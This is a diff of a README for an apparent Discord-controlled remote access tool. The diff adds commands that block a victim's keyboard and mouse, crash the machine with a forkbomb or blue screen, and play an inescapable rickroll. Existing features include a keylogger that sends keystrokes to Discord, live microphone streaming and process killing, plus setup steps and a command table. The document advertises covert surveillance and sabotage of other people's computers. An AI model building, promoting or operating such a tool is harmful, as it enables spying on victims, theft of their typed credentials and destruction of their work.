@@ -30,8 +30,11 @@ It can handle multiple Devices at once.
 - **Task Management:** List and kill processes.
 - **Purge Messages:** Clear bot messages and commands in the channel.
 - **Live Stream Mic:** Livestream the Computers Microphone to a discord voice channel.
-- **Keylogger** Log keystrokes and sends them to a Discord channel
-- **TTS** Play Text To Speech Messages on the Computer
+- **Keylogger:** Log keystrokes and sends them to a Discord channel
+- **TTS:** Play Text To Speech Messages on the Computer
+- **Block Input:** Completely block the users input, Keyboard and Mouse.
+- **Crash/bsod:** Crash the Computer, with a Forkbomb or a Blue Screen of Death.
+- **Rickroll:** Play a full screen rickroll, you can only escape it with the Power Button or `Ctrl + Alt + Delete`.
 
 ## Requirements
 
@@ -64,7 +67,7 @@ Update the following variables in the script:
 - `TOKEN`: The token for your Discord bot. _Line 2_
 - `GUILD_ID`: The ID of the guild where the bot will operate. _Line 4_
 - `AUTHORIZED_USERS`: A list of user IDs that are authorized to control the bot. _Line 7_
-- `channel_ids['voice']`: The ID of an Voice Channel on your Server. _Line 180_
+- `channel_ids['voice']`: The ID of an Voice Channel on your Server. _Line 188_
 
 ## Running the Bot
 
@@ -99,7 +102,10 @@ Hier ist die aktualisierte Tabelle, die die zusätzlichen Commands enthält:
 | `!tts <message>`             | Plays a custom text-to-speech message.                                                              |
 | `!mic_stream_start`          | Starts a live stream of the microphone to a voice channel.                                          |
 | `!mic_stream_stop`           | Stops the mic stream if activated.                                                                  |
-| `!keylog <on/off>`           | Activates or deactivates keylogging.                                                                |                                                       |
+| `!keylog <on/off>`           | Activates or deactivates keylogging.                                                                |
+| `!input <block/unblock>`     | Completely blocks or unblocks the User Input, Keyboard and Mouse.                                   |                                                       |
+| `!rickroll`                  | Plays an inescapeable Rickroll.                                                                     |
+| `!bsod`                      | Triggers a Blue Screen of Death.                                                                    |
 
 ### Example Usage
 
